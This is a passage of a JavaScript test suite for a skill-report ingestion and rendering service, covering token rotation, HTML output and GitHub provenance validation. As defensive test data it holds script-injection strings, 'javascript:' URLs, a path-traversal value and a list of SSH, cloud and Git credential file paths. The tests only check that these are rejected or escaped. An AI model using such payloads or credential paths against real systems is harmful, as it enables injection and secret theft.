      clearTimeout(timeout);
      stream.removeListener("data", finish);
      child.removeListener("error", failure);
      done();
    };
    const failure = (error) => {
      clearTimeout(timeout);
      stream.removeListener("data", finish);
      fail(error);
    };
    const timeout = setTimeout(() => failure(new Error("The isolated ingestion command did not produce its expected operational evidence.")), 5000);

    stream.on("data", finish);
    child.once("error", failure);
    finish();
  });

  await waitFor(child.stdout, () => stdout, /QuickStark readout ingestion: http:\/\/127\.0\.0\.1:\d+\//);

  const url = stdout.match(/QuickStark readout ingestion: (http:\/\/127\.0\.0\.1:\d+\/)/)?.[1];
  assert.ok(url);

  const response = await submitIngestion({ url }, nativeIngestionEnvelope());
  assert.equal(response.status, 201);

  await waitFor(child.stderr, () => stderr, /"outcome":"created"/);

  const audit = JSON.parse(stderr.trim().split("\n").at(-1));
  assert.equal(audit.producer, "codex-laptop");
  assert.equal(audit.project, "github.com/quickstark/skills");
  assert.equal(audit.status, 201);
  assert.equal(audit.outcome, "created");
  assert.doesNotMatch(stderr, /test-only-codex-laptop-credential|The real report is available/);
});

test("rotating producer grants immediately revokes old tokens without restarting ingestion", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const grantsPath = join(directory, "producer-grants.json");
  const originalToken = "test-only-original-rotating-producer-1234567890";
  const rotatedToken = "test-only-replaced-rotating-producer-1234567890";
  const independentToken = "test-only-independent-producer-secret-1234567890";
  const grants = (token) => ({
    version: 1,
    producers: [
      {
        id: "codex-laptop",
        tokenSha256: createHash("sha256").update(token).digest("hex"),
        projects: ["github.com/quickstark/skills"],
      },
      {
        id: "independent-laptop",
        tokenSha256: createHash("sha256").update(independentToken).digest("hex"),
        projects: ["github.com/quickstark/skills"],
      },
    ],
  });

  await writeFile(grantsPath, JSON.stringify(grants(originalToken)), {
    encoding: "utf8",
    mode: 0o600,
  });

  const viewer = await startReadoutServer({
    directory,
    port: 0,
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills"],
  });

  context.after(async () => {
    if (!viewer.server.listening) return;
    await new Promise((done, fail) => viewer.server.close((error) => error ? fail(error) : done()));
  });

  const ingestion = await startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: viewer.url,
    allowedProjects: ["github.com/quickstark/skills"],
    producersFile: grantsPath,
  });

  context.after(async () => {
    if (!ingestion.server.listening) return;
    await new Promise((done, fail) => ingestion.server.close((error) => error ? fail(error) : done()));
  });

  const first = await submitIngestion(ingestion, nativeIngestionEnvelope(), { token: originalToken });
  assert.equal(first.status, 201);
  const originalReport = await first.json();

  await writeFile(grantsPath, JSON.stringify(grants(rotatedToken)), { encoding: "utf8" });

  const revoked = await submitIngestion(ingestion, nativeIngestionEnvelope({
    runId: "e46fd0fd-94f1-4328-bd57-00c75143f470",
  }), { token: originalToken });
  assert.equal(revoked.status, 401);

  const rotated = await submitIngestion(ingestion, nativeIngestionEnvelope({
    runId: "e46fd0fd-94f1-4328-bd57-00c75143f471",
  }), { token: rotatedToken });
  assert.equal(rotated.status, 201);

  const independent = await submitIngestion(ingestion, nativeIngestionEnvelope({
    producer: "independent-laptop",
    runId: "e46fd0fd-94f1-4328-bd57-00c75143f472",
  }), { token: independentToken });
  assert.equal(independent.status, 201);

  assert.equal((await fetch(originalReport.url)).status, 200);
});

test("immutable skill submissions remain idempotent after an ingestion-server restart", async (context) => {
  const { directory, ingestion, viewer } = await temporaryReadoutIngestion(context);
  const first = await submitIngestion(ingestion, nativeIngestionEnvelope());
  const created = await first.json();

  await new Promise((done, fail) => ingestion.server.close((error) => error ? fail(error) : done()));

  const restarted = await startReadoutIngestionServer({
    directory,
    port: 0,
    baseUrl: viewer.url,
    allowedProjects: ["github.com/quickstark/skills"],
    producers: [{
      id: "codex-laptop",
      token: "test-only-codex-laptop-credential-1234567890",
      projects: ["github.com/quickstark/skills"],
    }],
  });

  context.after(async () => {
    if (!restarted.server.listening) return;
    await new Promise((done, fail) => restarted.server.close((error) => error ? fail(error) : done()));
  });

  const retry = await submitIngestion(restarted, nativeIngestionEnvelope());

  assert.equal(first.status, 201);
  assert.equal(retry.status, 200);
  assert.equal((await retry.json()).url, created.url);
  assert.equal((await fetch(created.url)).status, 200);
});

test("the portable publisher rejects forged hosted report origins, paths, and skills", async (context) => {
  let accepted;
  const imposter = createHttpServer((_request, response) => {
    response.writeHead(201, { "Content-Type": "application/json" });
    response.end(JSON.stringify(accepted));
  });

  await new Promise((done, fail) => {
    imposter.once("error", fail);
    imposter.listen(0, "127.0.0.1", done);
  });

  context.after(async () => {
    if (!imposter.listening) return;
    await new Promise((done, fail) => imposter.close((error) => error ? fail(error) : done()));
  });

  const endpoint = `http://127.0.0.1:${imposter.address().port}/api/v1/readouts`;
  const options = {
    endpoint,
    token: "test-only-codex-laptop-credential-1234567890",
    allowedProjects: ["github.com/quickstark/skills"],
    reportBaseUrl: "http://127.0.0.1:4173/",
    maxAttempts: 1,
  };
  const standard = {
    status: "created",
    project: "github.com/quickstark/skills",
    skill: "qs-code-build",
    reportId: "a6ba1c2b-d2a5-4962-b591-7d2bec883021",
  };

  for (const malicious of [
    { ...standard, url: "http://127.0.0.1:8443/github.com/quickstark/skills/2026/07/qs-code-build--2026-07-26T12-00-00-000Z--codex-laptop--a6ba1c2b-d2a5-4962-b591-7d2bec883021.html" },
    { ...standard, url: "http://127.0.0.1:4173/private/unrelated.html" },
    { ...standard, url: "http://127.0.0.1:4173/github.com/quickstark/skills/2026/07/qs-code-build--2026-07-26T12-00-00-000Z--codex-laptop--ffffffff-d2a5-4962-b591-7d2bec883021.html" },
    { ...standard, skill: "different-skill", url: "http://127.0.0.1:4173/github.com/quickstark/skills/2026/07/qs-code-build--2026-07-26T12-00-00-000Z--codex-laptop--a6ba1c2b-d2a5-4962-b591-7d2bec883021.html" },
  ]) {
    accepted = malicious;
    assert.deepEqual(await publishSkillReadout(nativeIngestionEnvelope(), options), {
      status: "local-only",
      reason: "invalid_publication_response",
    });
  }
});

test("the catalog preserves all 22 upstream skills and adds dedicated deployment and documentation skills", () => {
  assert.equal(UPSTREAM_SKILLS.length, 22);
  assert.equal(SKILLS.length, 24);
  assert.equal(SKILLS.filter((skill) => skill.upstreamName === null).length, 2);
  assert.ok(SKILLS.some((skill) => skill.name === "qs-deploy-release"));
  assert.ok(SKILLS.some((skill) => skill.name === "qs-code-document"));
});

test("skill names are unique, discoverable, and organized by purpose", () => {
  const names = SKILLS.map((skill) => skill.name);
  assert.equal(new Set(names).size, names.length);

  for (const name of names) {
    assert.match(name, new RegExp(`^${COLLECTION_PREFIX}-[a-z0-9]+(?:-[a-z0-9]+)*$`));
    assert.ok(name.length <= 64, `${name} exceeds the skill naming limit`);
  }

  for (const category of ["plan", "design", "code", "test", "review", "git", "flow", "deploy"]) {
    assert.ok(names.some((name) => name.startsWith(`${COLLECTION_PREFIX}-${category}-`)), `missing ${category} skills`);
  }
});

test("every skill has valid, specific, non-circular next-step recommendations", () => {
  const catalogNames = SKILLS.map((skill) => skill.name).sort();
  assert.deepEqual(Object.keys(NEXT_SKILLS_BY_NAME).sort(), catalogNames);

  for (const skill of SKILLS) {
    const nextSkills = NEXT_SKILLS_BY_NAME[skill.name];

    assert.ok(Array.isArray(nextSkills), `${skill.name} has no next-skill list`);
    assert.ok(nextSkills.length >= 1 && nextSkills.length <= 3);
    assert.equal(
      new Set(nextSkills.map((next) => next.name)).size,
      nextSkills.length,
      `${skill.name} repeats a recommendation`,
    );

    for (const next of nextSkills) {
      assert.ok(SKILLS_BY_NAME.has(next.name), `${skill.name} recommends an unknown skill`);
      assert.notEqual(next.name, skill.name, `${skill.name} recommends itself`);
      assert.equal(typeof next.reason, "string");
      assert.ok(next.reason.trim().length >= 20, `${skill.name} has a vague next-step reason`);
    }
  }
});

test("every promoted skill has transparent heuristic model and thinking guidance", () => {
  const catalogNames = SKILLS.map((skill) => skill.name).sort();

  assert.deepEqual(Object.keys(MODEL_GUIDANCE_BY_NAME).sort(), catalogNames);

  for (const skill of SKILLS) {
    const guidance = MODEL_GUIDANCE_BY_NAME[skill.name];

    assert.ok(["gpt-5.6-sol", "gpt-5.6-terra"].includes(guidance.model));
    assert.ok(["low", "medium", "high", "xhigh", "max", "ultra"].includes(guidance.thinking));
    assert.equal(typeof guidance.reason, "string");
    assert.ok(guidance.reason.trim().length >= 20, `${skill.name} needs an informative heuristic`);
  }
});

test("every promoted skill derives copy-ready next prompts from its actual outcome and approved catalog", () => {
  for (const skill of SKILLS) {
    const outcome = `Recorded the actual ${skill.displayName} outcome.`;
    const report = normalizeSkillReadout({ skill: skill.name, outcome });

    assert.equal(report.nextSkills.length, NEXT_SKILLS_BY_NAME[skill.name].length);

    for (const next of report.nextSkills) {
      const target = SKILLS_BY_NAME.get(next.name);

      assert.ok(target, `${skill.name} recommends an unknown skill`);
      assert.ok(next.prompt.includes(`Use $${target.name} to ${target.prompt}.`));
      assert.ok(next.prompt.includes(outcome), `${skill.name} omits the actual prior outcome`);
      assert.equal(next.model, MODEL_GUIDANCE_BY_NAME[target.name].model);
      assert.equal(next.thinking, MODEL_GUIDANCE_BY_NAME[target.name].thinking);
      assert.equal(next.modelReason, MODEL_GUIDANCE_BY_NAME[target.name].reason);
      assert.equal(next.modelSource, "heuristic");
    }
  }
});

test("every promoted skill has a distinct, self-contained architecture-quality HTML readout", () => {
  for (const skill of SKILLS) {
    const html = renderSkillReadout({
      skill: skill.name,
      status: "Completed",
      outcome: `Completed the ${skill.displayName} workflow.`,
      findings: [{ title: "Skill purpose", detail: skill.shortDescription }],
    });

    assert.match(html, /^<!doctype html>/i, `${skill.name} is not a browser-ready HTML document`);
    assert.ok(html.includes(skill.displayName), `${skill.name} omits its readable display name`);
    assert.ok(html.includes(`/${skill.name}`), `${skill.name} omits its actual command`);
    assert.ok(html.includes('content="Completed"'), `${skill.name} omits the actual report status`);
    assert.ok(html.includes("Top next prompts"), `${skill.name} omits actionable follow-on prompts`);
    assert.ok(html.includes("Self-contained HTML"), `${skill.name} omits its offline guarantee`);
    assert.doesNotMatch(html, /<script\b/i, `${skill.name} unexpectedly depends on executable scripts`);
    assert.doesNotMatch(html, /<link\b[^>]+rel=["']stylesheet/i, `${skill.name} depends on external styles`);

    for (const next of NEXT_SKILLS_BY_NAME[skill.name]) {
      assert.ok(html.includes(`/${next.name}`), `${skill.name} omits /${next.name}`);
    }
  }
});

test("every promoted report uses the selected B presentation and an honest five-second summary", () => {
  for (const skill of SKILLS) {
    const html = renderSkillReadout({
      skill: skill.name,
      outcome: `Recorded the actual ${skill.displayName} outcome.`,
      findings: [{ title: "Observed report behavior", detail: "A directly recorded result." }],
      checks: [{ title: "Actual report check", status: "passed" }],
    });

    assert.match(html, /aria-label="Verified project and run metadata"/, skill.name);
    assert.match(html, /aria-label="Five-second report summary"/, skill.name);
    assert.match(html, /NO CRITICAL EXCEPTIONS/, skill.name);
    assert.match(html, /presentation-featured-signal/, skill.name);
    assert.match(html, /1 of 1 recorded checks passed/, skill.name);
    assert.match(html, /--presentation-body:12px/, skill.name);
    assert.match(html, /--presentation-feature:13px/, skill.name);
    assert.ok(
      html.indexOf('aria-label="Verified project and run metadata"')
        < html.indexOf('aria-label="Five-second report summary"'),
      `${skill.name} must present verified project metadata before the visual summary`,
    );
    assert.ok(
      html.indexOf('aria-label="Five-second report summary"')
        < html.indexOf("Top next prompts"),
      `${skill.name} must present its five-second summary before contextual next prompts`,
    );
  }
});

test("a production B report features only actual blocked states, critical findings, and failed checks", () => {
  const regular = renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Diagnosed the actual panel-height regression.",
    findings: [{ title: "The application was cut off by a legacy panel-height cap" }],
    checks: [{ title: "Actual regression verification", status: "passed" }],
  });

  assert.match(regular, /NO CRITICAL EXCEPTIONS/);
  assert.match(regular, /LEAD OBSERVATION/);
  assert.match(regular, /The application was cut off by a legacy panel-height cap/);
  assert.doesNotMatch(regular, /1 explicitly recorded exception/);

  const critical = renderSkillReadout({
    skill: "qs-code-debug",
    outcome: "Observed a directly recorded regression.",
    findings: [{ title: "Verified production blocker", priority: "P1" }],
    checks: [{ title: "Observed failed regression", status: "failed" }],
  });

  assert.match(critical, /NEEDS ATTENTION/);
  assert.match(critical, /2 explicitly recorded exceptions/);
  assert.match(critical, /Verified production blocker/);
  assert.match(critical, /0 of 1 recorded checks passed/);
});

test("production catalog previews preserve an honest first-run visual state", () => {
  const html = renderSkillReadout({
    skill: "qs-setup",
    status: "Preview",
    skillsUsed: [],
    outcome: "Catalog preview only; no project setup ran.",
    findings: [{ title: "Purpose", detail: "Configure project trackers, labels, and docs." }],
  });

  assert.match(html, /READY TO RUN/);
  assert.match(html, /FIRST RUN/);
  assert.match(html, /No actual skill run has been recorded/);
  assert.match(html, /No checks recorded/);
  assert.doesNotMatch(html, /NO CRITICAL EXCEPTIONS|1 of 1 recorded checks passed/);
});

test("GitHub metadata and issues enter production only after independently verified repository ownership", async () => {
  const requested = [];
  const project = {
    host: "github.com",
    owner: "quickstark",
    repository: "skills",
    key: "github.com/quickstark/skills",
    label: "quickstark/skills",
    source: "git-origin",
  };
  const fetcher = async (url) => {
    requested.push(url);

    if (url.endsWith("/issues?state=open&per_page=8")) {
      return new Response(JSON.stringify([{
        number: 21,
        title: "Verify the QuickStark report workbench",
        state: "open",
        html_url: "https://github.com/quickstark/skills/issues/21",
        labels: [{ name: "ready-for-agent" }],
      }, {
        number: 99,
        title: "Reject a cross-repository issue",
        state: "open",
        html_url: "https://github.com/other/repository/issues/99",
        labels: [],
      }]), { headers: { "Content-Type": "application/json" } });
    }

    if (url.includes("/search/issues?")) {
      return new Response(JSON.stringify({
        total_count: 1,
        incomplete_results: false,
        items: [],
      }), { headers: { "Content-Type": "application/json" } });
    }

    return new Response(JSON.stringify({
      full_name: "quickstark/skills",
      html_url: "https://github.com/quickstark/skills",
      default_branch: "main",
      visibility: "public",
    }), { headers: { "Content-Type": "application/json" } });
  };

  const github = await observeGitHubProject(project, { fetcher });

  assert.equal(requested.length, 3);
  assert.equal(github.fullName, "quickstark/skills");
  assert.equal(github.defaultBranch, "main");
  assert.equal(github.visibility, "public");
  assert.equal(github.openIssueCount, 1);
  assert.deepEqual(github.issues.map((issue) => issue.number), [21]);

  const mismatched = await observeGitHubProject(project, {
    fetcher: async () => new Response(JSON.stringify({
      full_name: "other/repository",
      html_url: "https://github.com/other/repository",
    }), { headers: { "Content-Type": "application/json" } }),
  });

  assert.equal(mismatched, null);
});

test("every skill presents its full next prompts as prominent accessible code blocks", () => {
  for (const skill of SKILLS) {
    const input = {
      skill: skill.name,
      outcome: `Recorded the actual ${skill.displayName} outcome.`,
    };
    const report = normalizeSkillReadout(input);
    const html = renderSkillReadout(input);
    const blocks = [...html.matchAll(
      /<pre class="next-prompt-block"><code>([\s\S]*?)<\/code><\/pre>/g,
    )];

    assert.equal(blocks.length, report.nextSkills.length, skill.name);

    for (const [index, next] of report.nextSkills.entries()) {
      assert.equal(
        blocks[index][1],
        escapeHtml(next.prompt),
        `${skill.name} does not expose a complete copyable prompt`,
      );
      assert.doesNotMatch(blocks[index][1], /Suggested model|Suggested thinking|Heuristic suggestion/);
    }
  }
});

test("every promoted skill has its own complete, purpose-specific visual report profile", () => {
  const names = SKILLS.map((skill) => skill.name).sort();

  assert.deepEqual(Object.keys(READOUT_PROFILES_BY_NAME).sort(), names);
  assert.equal(
    new Set(Object.values(READOUT_PROFILES_BY_NAME).map((profile) => profile.title)).size,
    SKILLS.length,
    "Every skill must communicate its own distinct report purpose.",
  );

  for (const skill of SKILLS) {
    const profile = READOUT_PROFILES_BY_NAME[skill.name];

    assert.ok(profile.title.length >= 8, `${skill.name} needs a meaningful report title.`);
    assert.ok(profile.signal.length >= 8, `${skill.name} must identify its actual primary signal.`);
    assert.ok(
      ["map", "flow", "bars", "matrix", "checks", "brief"].includes(profile.visualization),
      `${skill.name} needs a supported, self-contained visual cue.`,
    );
    assert.deepEqual(
      [...profile.sections].sort(),
      ["checks", "decisions", "findings", "outputs"],
      `${skill.name} must retain every actual report field in a purpose-specific order.`,
    );
  }
});

test("actual skill reports identify the actual execution machine after top next prompts", () => {
  for (const skill of SKILLS) {
    const input = {
      skill: skill.name,
      outcome: `Verified the actual ${skill.displayName} execution machine.`,
    };
    const report = normalizeSkillReadout(input);
    const html = renderSkillReadout(input);

    assert.equal(report.execution.machine.hostname, hostname(), skill.name);
    assert.equal(report.execution.machine.platform, platform(), skill.name);
    assert.match(html, /Execution context/);
    assert.ok(html.includes(hostname()), `${skill.name} omits its actual execution machine`);
    assert.ok(html.includes(`<meta name="quickstark:machine" content="${hostname()}">`));
    assert.ok(
      html.indexOf("Top next prompts") < html.indexOf("Execution context"),
      `${skill.name} must show its top next prompts before execution context`,
    );
  }
});

test("deployment reports prominently identify only verified deployment environments and URLs", () => {
  const url = "https://reports.quickstark.com/";
  const html = renderSkillReadout({
    skill: "qs-deploy-release",
    outcome: "Verified the authenticated report deployment.",
    execution: {
      deployments: [
        {
          environment: "production",
          status: "verified",
          url,
          summary: "Authelia protects the production report viewer.",
        },
      ],
    },
  });

  assert.match(html, /Execution context/);
  assert.match(html, /Verified deployment · production/);
  assert.ok(html.includes(url));
  assert.match(html, /Authelia protects the production report viewer/);
  assert.match(html, /<meta name="quickstark:deployment-url"/);
  assert.ok(
    html.indexOf("Top next prompts") < html.indexOf("Verified deployment · production"),
    "top next prompts remain visible before verified deployment evidence",
  );
});

test("architecture, module, implementation, and documentation reports foreground actual changed files", () => {
  for (const skill of [
    "qs-design-architecture",
    "qs-design-modules",
    "qs-code-build",
    "qs-code-document",
  ]) {
    const html = renderSkillReadout({
      skill,
      outcome: "Recorded only files actually modified by this skill run.",
      execution: {
        files: [
          {
            path: "scripts/qs-skill-readout.mjs",
            change: "modified",
            summary: "Display verified run context near the report heading.",
          },
          {
            path: "docs/engineering/qs-code-document.md",
            change: "added",
            summary: "Describe the new documentation workflow.",
          },
        ],
      },
    });

    assert.match(html, /Execution context/);
    assert.match(html, /Modified file/);
    assert.match(html, /Added file/);
    assert.match(html, /scripts\/qs-skill-readout\.mjs/);
    assert.match(html, /docs\/engineering\/qs-code-document\.md/);
    assert.match(html, /quickstark:changed-file/);
  }
});

test("execution context rejects fabricated machines, unsafe deployment URLs, and unsafe file paths", () => {
  const base = {
    skill: "qs-code-build",
    outcome: "Validate actual execution evidence.",
  };

  for (const [label, execution, expected] of [
    [
      "different execution machine",
      { machine: { hostname: "invented-remote-host", platform: platform() } },
      /actual execution machine/i,
    ],
    [
      "different execution platform",
      { machine: { hostname: hostname(), platform: "invented-os" } },
      /actual execution platform/i,
    ],
    [
      "unsafe deployment protocol",
      { deployments: [{ environment: "production", status: "verified", url: "javascript:alert(1)" }] },
      /HTTP or HTTPS deployment URL/i,
    ],
    [
      "credential-bearing deployment URL",
      { deployments: [{ environment: "production", status: "verified", url: "https://token@reports.quickstark.com/" }] },
      /credentials/i,
    ],
    [
      "query-bearing deployment URL",
      { deployments: [{ environment: "production", status: "verified", url: "https://reports.quickstark.com/?token=secret" }] },
      /query parameters/i,
    ],
    [
      "invented deployment status",
      { deployments: [{ environment: "production", status: "probably", url: "https://reports.quickstark.com/" }] },
      /actual deployment status/i,
    ],
    [
      "absolute machine path",
      { files: [{ path: "/home/private/secrets.txt", change: "modified" }] },
      /relative project file/i,
    ],
    [
      "traversal path",
      { files: [{ path: "../../private.txt", change: "modified" }] },
      /relative project file/i,
    ],
    [
      "secret environment file",
      { files: [{ path: ".env.production", change: "modified" }] },
      /sensitive/i,
    ],
    [
      "invented file change",
      { files: [{ path: "README.md", change: "imagined" }] },
      /actual file change/i,
    ],
  ]) {
    assert.throws(() => normalizeSkillReadout({ ...base, execution }), expected, label);
  }
});

test("changed-file metadata rejects Git, cloud, package-manager, and private-key credential paths", () => {
  for (const path of [
    ".git/config",
    ".git-credentials",
    ".npmrc",
    ".pypirc",
    ".netrc",
    ".envrc",
    ".aws/credentials",
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".docker/config.json",
    ".kube/config",
    "credentials.json",
    "secrets.yaml",
    "private.key",
    "config/service-account.json",
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-code-build",
      outcome: "Validate safe changed-file evidence.",
      execution: {
        files: [{ path, change: "modified" }],
      },
    }), /sensitive/i, path);
  }
});

test("execution context escapes observed summaries and never attributes unrelated dirty files", () => {
  const hostile = '<script>alert("unsafe")</script>';
  const html = renderSkillReadout({
    skill: "qs-code-document",
    outcome: "Recorded only the documentation file changed by this run.",
    execution: {
      files: [{
        path: "docs/engineering/qs-code-document.md",
        change: "added",
        summary: hostile,
      }],
    },
  });

  assert.match(html, /docs\/engineering\/qs-code-document\.md/);
  assert.match(html, /&lt;script&gt;alert\(&quot;unsafe&quot;\)&lt;\/script&gt;/);
  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /package\.json/, "Unrelated dirty files must not be attributed to this skill run.");

  assert.throws(() => normalizeSkillReadout({
    skill: "qs-code-document",
    outcome: "Validate the actual documentation change.",
    execution: {
      files: [
        { path: "docs/engineering/qs-code-document.md", change: "added" },
        { path: "docs/engineering/qs-code-document.md", change: "modified" },
      ],
    },
  }), /must not repeat/i);
});

test("catalog previews neither expose the execution machine nor claim deployments or changed files", () => {
  const input = {
    skill: "qs-code-document",
    status: "Preview",
    skillsUsed: [],
    outcome: "Catalog preview only.",
  };
  const html = renderSkillReadout(input);

  assert.doesNotMatch(html, /Execution context/);
  assert.doesNotMatch(html, /quickstark:machine|quickstark:deployment-url|quickstark:changed-file/);

  assert.throws(() => normalizeSkillReadout({
    ...input,
    execution: {
      deployments: [{
        environment: "production",
        status: "verified",
        url: "https://reports.quickstark.com/",
      }],
    },
  }), /preview cannot claim actual execution/i);

  assert.throws(() => normalizeSkillReadout({
    ...input,
    execution: { files: [{ path: "README.md", change: "modified" }] },
  }), /preview cannot claim actual execution/i);
});

test("the documentation skill has a distinct, evidence-led documentation coverage report", () => {
  const profile = READOUT_PROFILES_BY_NAME["qs-code-document"];

  assert.equal(profile.title, "Documentation coverage");
  assert.equal(profile.visualization, "checks");

  const html = renderSkillReadout({
    skill: "qs-code-document",
    outcome: "Documented the verified report contract and deployment behavior.",
    execution: {
      files: [{
        path: "docs/skill-report-assessment.md",
        change: "modified",
        summary: "Document machine, deployment, and changed-file reporting.",
      }],
    },
    outputs: [{
      title: "Report evidence documentation",
      detail: "Documented only observed behavior and supported report fields.",
    }],
    checks: [{
      title: "Documentation examples agree with implementation",
      status: "passed",
      detail: "Verified each reported field against the actual renderer.",
    }],
  });

  assert.match(html, /Documentation coverage/);
  assert.match(html, /Documented artifacts/);
  assert.match(html, /Documentation validation/);
  assert.match(html, /docs\/skill-report-assessment\.md/);
  assert.match(html, /1 passed/i);
});

test("GitHub-facing reports prominently preserve verified release, issue, PR, and commit evidence", () => {
  const provenance = verifiedGithubProvenance();
  const input = {
    skill: "qs-git-merge",
    outcome: "Merged and verified the observed release changes.",
    projectIdentity: explicitProject("skills"),
    provenance,
  };
  const report = normalizeSkillReadout(input);
  const html = renderSkillReadout(input);

  assert.equal(report.provenance.pullRequests[0].number, 42);
  assert.equal(report.provenance.pullRequests[0].state, "merged");
  assert.equal(report.provenance.closedIssues[0].closedByRelease, true);
  assert.equal(report.provenance.release.version, "v2.3.1");
  assert.equal(report.provenance.commit.published, true);
  assert.match(html, /Verified delivery evidence/);
  assert.match(html, /Merged pull request/);
  assert.match(html, /#42/);
  assert.match(html, /Issues verified as closed by this release/);
  assert.match(html, /#17/);
  assert.match(html, /Released version/);
  assert.match(html, /v2\.3\.1/);
  assert.match(html, /Published commit/);
  assert.match(html, /0123456789abcdef0123456789abcdef01234567/);
  assert.match(html, /https:\/\/github\.com\/quickstark\/skills\/pull\/42/);
  assert.match(html, /quickstark:release-version/);
  assert.match(html, /quickstark:commit-sha/);
  assert.ok(
    html.indexOf("<h2>Top next prompts</h2>")
      < html.indexOf("<h2>Verified delivery evidence</h2>"),
    "top next prompts remain visible before verified delivery evidence",
  );
});

test("partial delivery evidence distinguishes a verified local commit from a published release", () => {
  const sha = "70ac659d11111111111111111111111111111111";
  const html = renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Recorded a locally committed implementation.",
    provenance: { commit: { sha, published: false } },
  });

  assert.match(html, /Verified delivery evidence/);
  assert.match(html, /Local commit/);
  assert.match(html, new RegExp(sha));
  assert.doesNotMatch(html, /Published commit|Merged pull request|Released version|Closed issues/);
});

test("reports omit delivery provenance completely when no GitHub evidence was observed", () => {
  for (const skill of SKILLS) {
    const html = renderSkillReadout({
      skill: skill.name,
      outcome: `Completed the actual ${skill.displayName} workflow.`,
    });

    assert.doesNotMatch(html, /Verified delivery evidence/, skill.name);
    assert.doesNotMatch(html, /quickstark:release-version|quickstark:commit-sha/, skill.name);
  }
});

test("GitHub provenance rejects unsafe, mismatched, unverified, and cross-project records", () => {
  const base = {
    skill: "qs-deploy-release",
    outcome: "Validate release evidence.",
    projectIdentity: explicitProject("skills"),
  };

  for (const [label, provenance, expected] of [
    [
      "unsafe pull request protocol",
      { pullRequests: [{ number: 42, url: "javascript:alert(1)" }] },
      /HTTPS GitHub URL/i,
    ],
    [
      "credential-bearing pull request URL",
      { pullRequests: [{ number: 42, url: "https://token@github.com/quickstark/skills/pull/42" }] },
      /credentials/i,
    ],
    [
      "different repository",
      { pullRequests: [{ number: 42, url: "https://github.com/other/project/pull/42" }] },
      /verified project/i,
    ],
    [
      "different pull request number",
      { pullRequests: [{ number: 42, url: "https://github.com/quickstark/skills/pull/43" }] },
      /pull request number/i,
    ],
    [
      "open issue presented as closed",
      { closedIssues: [{ number: 17, state: "open", url: "https://github.com/quickstark/skills/issues/17" }] },
      /actually closed/i,
    ],
    [
      "closure attributed to a nonexistent release",
      { closedIssues: [{ number: 17, state: "closed", closedByRelease: true, url: "https://github.com/quickstark/skills/issues/17" }] },
      /verified release/i,
    ],
    [
      "invalid Git hash",
      { commit: { sha: "not-a-commit" } },
      /Git commit hash/i,
    ],
    [
      "abbreviated Git hash",
      { commit: { sha: "70ac659" } },
      /complete.*Git commit hash/i,
    ],
    [
      "unpublished commit presented as a remote link",
      {
        commit: {
          sha: "0123456789abcdef0123456789abcdef01234567",
          published: false,
          url: "https://github.com/quickstark/skills/commit/0123456789abcdef0123456789abcdef01234567",
        },
      },
      /published commit/i,
    ],
    [
      "release tag mismatch",
      { release: { version: "v2.3.1", url: "https://github.com/quickstark/skills/releases/tag/v9.9.9" } },
      /release version/i,
    ],
  ]) {
    assert.throws(() => normalizeSkillReadout({ ...base, provenance }), expected, label);
  }
});

test("GitHub delivery evidence cannot be attached to a verified non-GitHub project", () => {
  for (const projectIdentity of [
    {
      host: "gitlab.com",
      owner: "acme",
      repository: "private",
      key: "gitlab.com/acme/private",
      label: "acme/private",
      source: "git-origin",
    },
    {
      host: "local",
      owner: "workspace",
      repository: "private-0123456789ab",
      key: "local/workspace/private-0123456789ab",
      label: "Private local workspace",
      source: "workspace",
    },
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-git-merge",
      outcome: "Verify repository isolation.",
      projectIdentity,
      provenance: {
        pullRequests: [{
          number: 42,
          url: "https://github.com/quickstark/skills/pull/42",
        }],
      },
    }), /verified project/i, projectIdentity.key);
  }
});

test("delivery evidence escapes externally controlled GitHub record titles", () => {
  const hostile = '<script>alert("unsafe")</script>';
  const provenance = verifiedGithubProvenance();

  provenance.pullRequests[0].title = hostile;
  provenance.closedIssues[0].title = hostile;

  const html = renderSkillReadout({
    skill: "qs-git-merge",
    outcome: "Rendered independently verified GitHub records safely.",
    projectIdentity: explicitProject("skills"),
    provenance,
  });

  assert.match(html, /Verified delivery evidence/);
  assert.match(html, /&lt;script&gt;alert\(&quot;unsafe&quot;\)&lt;\/script&gt;/);
  assert.doesNotMatch(html, /<script\b/i);
});

test("catalog previews reject all claimed GitHub and release provenance", () => {
  assert.throws(() => normalizeSkillReadout({
    skill: "qs-deploy-release",
    status: "Preview",
    skillsUsed: [],
    outcome: "Catalog preview only.",
    provenance: verifiedGithubProvenance(),
  }), /preview cannot claim actual.*provenance/i);
});

test("review reports preserve independent Standards and Specification priorities", () => {
  const html = renderSkillReadout({
    skill: "qs-review-code",
    outcome: "Reviewed standards and specification requirements independently.",
    findings: [
      {
        title: "Verify repository-matched pull request URLs",
        detail: "scripts/qs-skill-readout.mjs:350",
        axis: "standards",
        priority: "P1",
      },
      {
        title: "Preserve actual released issue closures",
        detail: "docs/specs/project-aware-skill-readout-gallery.md:106",
        axis: "specification",
        priority: "P2",
      },
    ],
  });

  assert.match(html, /Standards findings/);
  assert.match(html, /Specification findings/);
  assert.match(html, /Verify repository-matched pull request URLs/);
  assert.match(html, /Preserve actual released issue closures/);
  assert.match(html, /\bP1\b/);
  assert.match(html, /\bP2\b/);
  assert.ok(
    html.indexOf("Standards findings") < html.indexOf("Specification findings"),
    "Standards and specification findings must remain independently readable.",
  );
});

test("review findings reject invented priority and assessment axes", () => {
  for (const finding of [
    { title: "Unknown priority", priority: "urgent" },
    { title: "Unknown axis", axis: "vibes" },
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-review-code",
      outcome: "Validate a real review finding.",
      findings: [finding],
    }), /priority|review axis/i);
  }
});

test("visual flows draw arrows only for explicitly recorded item relationships", () => {
  const input = {
    skill: "qs-plan-tickets",
    outcome: "Recorded two independently observed implementation tickets.",
    outputs: [
      { title: "Create the report contract", detail: "The contract is available." },
      { title: "Verify the hosted readout", detail: "The behavior is verified." },
    ],
    decisions: [{ title: "Preserve backward compatibility" }],
  };
  const independent = renderSkillReadout(input);

  assert.match(independent, /Implementation ticket board/);
